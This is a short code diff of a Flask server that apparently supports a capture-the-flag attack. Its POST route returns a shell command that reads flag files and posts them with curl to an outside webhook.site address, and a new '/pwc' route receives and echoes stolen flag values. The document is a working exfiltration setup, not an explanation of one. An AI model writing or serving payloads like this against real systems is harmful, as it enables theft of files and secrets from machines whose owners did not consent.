@@ -14,13 +14,12 @@ def validate_filename(filename: str):
 
 @app.route('/', methods=['POST'])
 def get_index():
-    flag = request.files.get('fl')
-    print(flag.stream.read())
-    return 'use static', 200
-
-@app.route('/a', methods=['GET'])
-def get_script():
     return 'cat flag/*/* | curl -X POST --data-binary @- https://webhook.site/3ac78532-8d8b-4257-8593-3ee232134985', 200
+
+@app.route('/pwc', methods=['GET'])
+def get_pwc():
+    flag = request.args.get('flag')
+    return 'flagnya: ' + flag
 
 @app.route('/redirect')
 def redirect_page():
